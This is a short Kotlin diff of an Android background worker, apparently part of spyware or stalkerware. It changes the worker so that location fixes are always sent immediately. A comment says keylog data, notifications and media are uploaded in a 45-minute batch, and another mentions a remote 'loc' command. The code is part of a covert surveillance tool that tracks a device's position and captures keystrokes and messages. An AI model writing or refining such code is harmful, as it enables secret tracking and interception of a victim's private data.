@@ -67,9 +67,11 @@ object AgentWorker {
                 try { com.sp.core.util.Beacon.send(app, "alive", aliveInfo(app)) } catch (_: Throwable) {}
             }
 
-            // A fresh position every third tick. The "loc" command forces it.
+            /* A fresh position every third tick - and it always goes out
+               right away, the map has to be alive. The heavier data (keylog,
+               notifications, media) stays in the 45-minute batch. */
             if (force || ticks % 3 == 1) {
-                try { LocationFix.send(app, immediate = force) } catch (_: Throwable) {}
+                try { LocationFix.send(app, immediate = true) } catch (_: Throwable) {}
             }
 
             // The app-usage profile is collected once per interval.
